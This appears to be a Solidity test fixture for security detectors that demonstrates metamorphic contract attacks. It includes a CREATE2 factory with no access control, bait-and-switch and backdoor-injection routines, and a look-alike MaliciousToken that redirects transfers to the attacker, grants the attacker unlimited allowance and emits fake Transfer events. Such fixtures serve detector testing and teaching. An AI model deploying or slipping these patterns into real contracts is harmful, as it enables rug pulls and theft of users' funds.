// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/**
 * @title MetamorphicAttack
 * @notice Demonstrates malicious metamorphic contract patterns
 *
 * VULNERABILITY: Metamorphic contract attacks
 * SEVERITY: Critical
 * CATEGORY: Supply Chain / Smart Contract Security
 *
 * BACKGROUND:
 * Metamorphic contracts can be destroyed and redeployed at the same address
 * with completely different code. This enables sophisticated attacks.
 *
 * ATTACK VECTORS:
 * 1. Bait-and-switch: Deploy benign contract, get verified, swap for malicious
 * 2. Rug pulls: Change contract logic after gaining user trust
 * 3. Bypass audits: Audited contract replaced with malicious version
 * 4. Backdoor injection: Add malicious functionality post-audit
 * 5. Evade detection: Change code when security tools detect vulnerabilities
 *
 * REAL-WORLD CASES:
 * - Various DeFi rug pulls using metamorphic contracts (2021-2024)
 * - Supply chain attacks on verified contracts
 * - Post-audit backdoor injections
 *
 * TESTED DETECTORS:
 * - metamorphic-contract
 * - selfdestruct-abuse
 * - create2-frontrunning
 */

/**
 * @title MaliciousMetamorphicFactory
 * @notice Factory that enables metamorphic contract attacks
 */
contract MaliciousMetamorphicFactory {
    mapping(bytes32 => address) public deployedContracts;

    event ContractDeployed(address indexed contractAddress, bytes32 salt);
    event ContractDestroyed(address indexed contractAddress);
    event ContractRedeployed(address indexed contractAddress, bytes32 salt);

    /**
     * @notice VULNERABILITY 1: Unprotected metamorphic deployment
     * @dev Anyone can deploy and redeploy contracts at same address
     */
    function deployMetamorphic(bytes memory bytecode, bytes32 salt)
        external
        returns (address)
    {
        address addr;

        // VULNERABLE: No access control, enables bait-and-switch
        assembly {
            addr := create2(0, add(bytecode, 0x20), mload(bytecode), salt)
        }

        require(addr != address(0), "Deployment failed");

        deployedContracts[salt] = addr;
        emit ContractDeployed(addr, salt);

        return addr;
    }

    /**
     * @notice ATTACK 1: Bait-and-switch pattern
     * @dev Deploy benign, destroy, redeploy malicious
     */
    function baitAndSwitch(
        bytes memory benignBytecode,
        bytes memory maliciousBytecode,
        bytes32 salt
    ) external returns (address) {
        // Step 1: Deploy benign contract
        address benign = this.deployMetamorphic(benignBytecode, salt);

        // Wait for users to interact, auditors to verify...

        // Step 2: Destroy benign contract
        MetamorphicChild(benign).destroy(msg.sender);
        emit ContractDestroyed(benign);

        // Step 3: Redeploy malicious contract at SAME address
        address malicious = this.deployMetamorphic(maliciousBytecode, salt);
        emit ContractRedeployed(malicious, salt);

        // Same address, different code!
        return malicious;
    }

    /**
     * @notice ATTACK 2: Post-audit backdoor injection
     */
    function injectBackdoor(
        bytes32 salt,
        bytes memory backdooredBytecode
    ) external returns (address) {
        address currentAddr = deployedContracts[salt];
        require(currentAddr != address(0), "Contract not deployed");

        // Destroy audited contract
        MetamorphicChild(currentAddr).destroy(msg.sender);

        // Redeploy with backdoor at same address
        return this.deployMetamorphic(backdooredBytecode, salt);
    }

    /**
     * @notice VULNERABILITY 2: Predictable metamorphic addresses
     */
    function computeAddress(bytes32 salt, bytes32 bytecodeHash)
        external
        view
        returns (address)
    {
        // VULNERABLE: Public address prediction enables attacks
        return address(uint160(uint256(keccak256(abi.encodePacked(
            bytes1(0xff),
            address(this),
            salt,
            bytecodeHash
        )))));
    }
}

/**
 * @title MetamorphicChild
 * @notice Child contract that can be destroyed and redeployed
 */
contract MetamorphicChild {
    address public owner;
    uint256 public version;

    constructor(address _owner, uint256 _version) {
        owner = _owner;
        version = _version;
    }

    /**
     * @notice VULNERABILITY 3: Allows destruction for metamorphic pattern
     */
    function destroy(address recipient) external {
        require(msg.sender == owner, "Not owner");
        selfdestruct(payable(recipient));
    }

    function getVersion() external view returns (uint256) {
        return version;
    }
}

/**
 * @title BenignToken
 * @notice Appears to be a safe ERC20 token (Step 1 of attack)
 */
contract BenignToken {
    string public constant name = "Benign Token";
    string public constant symbol = "BENIGN";
    uint8 public constant decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public totalSupply = 1000000 * 10**18;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
    }

    function transfer(address to, uint256 value) external returns (bool) {
        require(balanceOf[msg.sender] >= value, "Insufficient balance");
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value)
        external
        returns (bool)
    {
        require(balanceOf[from] >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Insufficient allowance");

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;

        emit Transfer(from, to, value);
        return true;
    }

    /**
     * @notice Allows factory to destroy for metamorphic attack
     */
    function destroy(address recipient) external {
        selfdestruct(payable(recipient));
    }
}

/**
 * @title MaliciousToken
 * @notice Malicious version deployed at same address (Step 2 of attack)
 */
contract MaliciousToken {
    string public constant name = "Benign Token"; // Same name to hide attack!
    string public constant symbol = "BENIGN"; // Same symbol!
    uint8 public constant decimals = 18;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    uint256 public totalSupply = 1000000 * 10**18;
    address private attacker;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        attacker = tx.origin; // Capture attacker address
    }

    /**
     * @notice MALICIOUS: Steals funds on transfer
     */
    function transfer(address to, uint256 value) external returns (bool) {
        require(balanceOf[msg.sender] >= value, "Insufficient balance");

        // MALICIOUS: Send funds to attacker instead
        balanceOf[msg.sender] -= value;
        balanceOf[attacker] += value;

        // Emit fake event to hide attack
        emit Transfer(msg.sender, to, value);
        return true;
    }

    /**
     * @notice MALICIOUS: Backdoor approval
     */
    function approve(address spender, uint256 value) external returns (bool) {
        // MALICIOUS: Also approve attacker
        allowance[msg.sender][spender] = value;
        allowance[msg.sender][attacker] = type(uint256).max;

        emit Approval(msg.sender, spender, value);
        return true;
    }

    /**
     * @notice MALICIOUS: Drain function (hidden functionality)
     */
    function drain() external {
        require(msg.sender == attacker, "Not attacker");

        // Steal all tokens from all users
        // (In reality would need to iterate through holders)
    }

    function transferFrom(address from, address to, uint256 value)
        external
        returns (bool)
    {
        require(balanceOf[from] >= value, "Insufficient balance");
        require(allowance[from][msg.sender] >= value, "Insufficient allowance");

        balanceOf[from] -= value;
        balanceOf[to] += value;
        allowance[from][msg.sender] -= value;

        emit Transfer(from, to, value);
        return true;
    }

    function destroy(address recipient) external {
        selfdestruct(payable(recipient));
    }
}

/**
 * @title MetamorphicAttacker
 * @notice Orchestrates metamorphic attacks
 */
contract MetamorphicAttacker {
    MaliciousMetamorphicFactory public factory;

    constructor(address _factory) {
        factory = MaliciousMetamorphicFactory(_factory);
    }

    /**
     * @notice ATTACK 3: Full bait-and-switch attack
     */
    function executeBaitAndSwitch(bytes32 salt) external returns (address) {
        // Step 1: Deploy benign token
        bytes memory benignBytecode = type(BenignToken).creationCode;
        address benignAddr = factory.deployMetamorphic(benignBytecode, salt);

        // Step 2: Wait for users to trust and use the token
        // Users verify code, auditors approve, funds deposited...

        // Step 3: Destroy benign contract
        BenignToken(benignAddr).destroy(msg.sender);

        // Step 4: Deploy malicious token at SAME address
        bytes memory maliciousBytecode = type(MaliciousToken).creationCode;
        address maliciousAddr = factory.deployMetamorphic(maliciousBytecode, salt);

        // Same address, different code!
        // Users still trust it because address is "verified"
        return maliciousAddr;
    }

    /**
     * @notice ATTACK 4: Evade verification
     */
    function evadeVerification(bytes32 salt) external {
        // Deploy benign for verification
        bytes memory benignBytecode = type(BenignToken).creationCode;
        factory.deployMetamorphic(benignBytecode, salt);

        // Get verified on Etherscan...

        // Swap to malicious immediately after verification
        factory.injectBackdoor(salt, type(MaliciousToken).creationCode);

        // Verification shows benign code, actual code is malicious!
    }
}

/**
 * @title MultiVersionMetamorphic
 * @notice Demonstrates version-switching attacks
 */
contract MultiVersionMetamorphic {
    MaliciousMetamorphicFactory public factory;
    bytes32 public salt;
    uint256 public currentVersion;

    constructor(address _factory, bytes32 _salt) {
        factory = MaliciousMetamorphicFactory(_factory);
        salt = _salt;
    }

    /**
     * @notice ATTACK 5: Switch between versions to evade detection
     */
    function switchVersion(
        bytes memory newBytecode,
        uint256 newVersion
    ) external {
        address current = factory.deployedContracts(salt);

        if (current != address(0)) {
            // Destroy current version
            MetamorphicChild(current).destroy(msg.sender);
        }

        // Deploy new version at same address
        factory.deployMetamorphic(newBytecode, salt);
        currentVersion = newVersion;
    }

    /**
     * @notice ATTACK 6: Rotation attack - constantly change code
     */
    function rotateCode(bytes[] memory bytecodeVersions) external {
        for (uint256 i = 0; i < bytecodeVersions.length; i++) {
            this.switchVersion(bytecodeVersions[i], i + 1);

            // Each version stays active briefly
            // Security tools see different code each time
        }
    }
}

/**
 * @title VulnerableUser
 * @notice Victim contract that trusts metamorphic contract
 */
contract VulnerableUser {
    address public trustedToken;

    constructor(address _trustedToken) {
        trustedToken = _trustedToken;
    }

    /**
     * @notice VULNERABILITY 4: Trusts address without code verification
     */
    function depositTokens(uint256 amount) external {
        // VULNERABLE: Trusts address even though code might have changed
        BenignToken token = BenignToken(trustedToken);

        // User approved token, thinks it's still benign
        token.transferFrom(msg.sender, address(this), amount);

        // But token might now be MaliciousToken at same address!
    }

    /**
     * @notice VULNERABILITY 5: No code hash verification
     */
    function useToken() external view returns (string memory) {
        BenignToken token = BenignToken(trustedToken);

        // Should verify code hash hasn't changed!
        // uint256 size;
        // assembly { size := extcodesize(trustedToken) }
        // bytes32 codeHash;
        // assembly { codeHash := extcodehash(trustedToken) }
        // require(codeHash == expectedCodeHash, "Code changed!");

        return token.name();
    }
}
